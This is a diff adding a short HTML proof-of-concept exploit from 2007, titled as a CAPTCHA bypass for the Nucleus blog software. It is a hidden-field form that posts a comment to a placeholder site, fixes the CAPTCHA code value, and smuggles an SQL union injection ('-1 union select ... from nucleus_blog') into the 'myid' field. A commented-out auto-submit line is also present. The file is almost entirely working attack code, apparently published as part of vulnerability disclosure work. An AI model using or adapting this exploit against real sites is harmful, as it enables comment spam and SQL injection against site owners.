@@ -1,0 +1,22 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;MoBiC-20 Bonus: another Nucleus CAPTCHA bypass exploit (C) 2007 
+MustLive. http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;!-- &lt;body onLoad=&quot;document.hack.submit()&quot;&gt; --&gt;
+&lt;body&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/action.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;addcomment&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;code&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;index.php?itemid=1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;itemid&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;body&quot; value=&quot;Captcha bypass test.&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;myid&quot; value=&quot;-1 union select 1,1,1 from 
+nucleus_blog&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remember&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;conf&quot; value=&quot;1&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
